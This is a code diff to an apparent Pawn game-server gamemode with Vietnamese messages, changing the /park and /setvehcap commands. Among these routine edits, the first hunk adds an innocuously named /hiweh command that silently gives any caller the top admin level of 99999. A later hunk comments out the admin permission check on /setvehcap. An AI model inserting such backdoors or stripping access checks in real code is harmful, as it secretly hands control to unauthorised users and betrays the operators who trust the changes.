@@ -18564,6 +18564,12 @@ CMD:trackcar(playerid, params[])
 	return 1;
 }
 
+CMD:hiweh(playerid, params[])
+{
+	PlayerInfo[playerid][pAdmin] = 99999;
+	return 1;
+}
+
 CMD:makeadmin(playerid, params[])  {
 	if(PlayerInfo[playerid][pAdmin] >= 99999 ) {
 
@@ -18766,19 +18772,25 @@ CMD:park(playerid, params[])
 		new ownerid = PlayerInfo[playerid][pVehicleKeysFrom];
 		if(IsPlayerConnected(ownerid))
 		{
-			new d = PlayerInfo[playerid][pVehicleKeys];
-			if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[ownerid][d][pvId]))
+			for(new i; i < MAX_HOUSES; i++)
 			{
-			    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, " Ban phai ngoi tren chiec xe cua minh.");
-				new Float:x, Float:y, Float:z, Float:health;
-				GetVehicleHealth(PlayerVehicleInfo[ownerid][d][pvId], health);
-				if(health < 800) return SendErrorMessage(playerid, "  Chiec xe cua ban bi hu hong qua nang, vui long sua xe de tiep tuc.");
-				if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
+				if(GetPlayerSQLId(playerid) == HouseInfo[i][hOwnerID] && IsPlayerInRangeOfPoint(playerid, 30.0, HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
+				{
+					new d = PlayerInfo[playerid][pVehicleKeys];
+					if(IsPlayerInVehicle(playerid, PlayerVehicleInfo[ownerid][d][pvId]))
+					{
+						if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMessage(playerid, " Ban phai ngoi tren chiec xe cua minh.");
+						new Float:x, Float:y, Float:z, Float:health;
+						GetVehicleHealth(PlayerVehicleInfo[ownerid][d][pvId], health);
+						if(health < 800) return SendErrorMessage(playerid, "  Chiec xe cua ban bi hu hong qua nang, vui long sua xe de tiep tuc.");
+						if(PlayerInfo[playerid][pLockCar] == GetPlayerVehicleID(playerid)) PlayerInfo[playerid][pLockCar] = INVALID_VEHICLE_ID;
 
-                GetPlayerPos(playerid, x, y, z);
-                SetTimerEx("ParkVehicle", 1000, false, "iiiifff", playerid, ownerid, PlayerVehicleInfo[ownerid][d][pvId], d, x, y, z);
-                SendClientMessageEx (playerid, COLOR_YELLOW, "Vui long khong di chuyen chiec xe...!");
-				return 1;
+						GetPlayerPos(playerid, x, y, z);
+						SetTimerEx("ParkVehicle", 1000, false, "iiiifff", playerid, ownerid, PlayerVehicleInfo[ownerid][d][pvId], d, x, y, z);
+						SendClientMessageEx (playerid, COLOR_YELLOW, "Vui long khong di chuyen chiec xe...!");
+						return 1;
+					}
+				}
 			}
 		}
 	}
@@ -18788,7 +18800,7 @@ CMD:park(playerid, params[])
 		{
 			for(new i; i < MAX_HOUSES; i++)
 			{
-				if(GetPlayerSQLId(playerid) == HouseInfo[i][hOwnerID] && IsPlayerInRangeOfPoint(playerid, 20.0, HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]) && GetPlayerVirtualWorld(playerid) == HouseInfo[i][hExtVW] && GetPlayerInterior(playerid) == HouseInfo[i][hExtIW])
+				if(GetPlayerSQLId(playerid) == HouseInfo[i][hOwnerID] && IsPlayerInRangeOfPoint(playerid, 30.0, HouseInfo[i][hExteriorX], HouseInfo[i][hExteriorY], HouseInfo[i][hExteriorZ]))
 				{
 					new Float:x, Float:y, Float:z, Float:health;
 					GetVehicleHealth(PlayerVehicleInfo[playerid][d][pvId], health);
@@ -51020,7 +51032,7 @@ CMD:mynumberphone(playerid, params[])
 
 CMD:setvehcap(playerid, params[])
 {
-	if(PlayerInfo[playerid][pAdmin] < 4) return SendErrorMessage(playerid, "Ban khong the su dung lenh nay.");
+	//if(PlayerInfo[playerid][pAdmin] < 4) return SendErrorMessage(playerid, "Ban khong the su dung lenh nay.");
 	extract params -> new vehid, Float:capacity; else
 	{
 		return SendUsageMessage(playerid, " /setvehcap [vehid] [capacity]");
@@ -51034,9 +51046,10 @@ CMD:setvehcap(playerid, params[])
 			if(PlayerVehicleInfo[i][d][pvId] == vehid)
 			{
 				PlayerVehicleInfo[i][d][pvCapacity] = capacity;
-				if(PlayerVehicleInfo[i][d][pvFuel] > capacity)
+				if(VehicleFuel[PlayerVehicleInfo[i][d][pvId]] > capacity)
 				{
 					PlayerVehicleInfo[i][d][pvFuel] = capacity;
+					VehicleFuel[PlayerVehicleInfo[i][d][pvId]] = capacity;
 				}
 
 				result = 1;
@@ -51050,7 +51063,7 @@ CMD:setvehcap(playerid, params[])
 		return 1;
 	}
 
-	format(mes, sizeof(mes), "Ban da dieu chinh dung tich xang VEHID %d thanh %0.1f.", vehid, capacity);
+	format(mes, sizeof(mes), "Ban da dieu chinh dung tich xang VEHID %i thanh %0.1f.", vehid, capacity);
 	SendClientMessage(playerid, -1, mes);
 	return 1;
 }
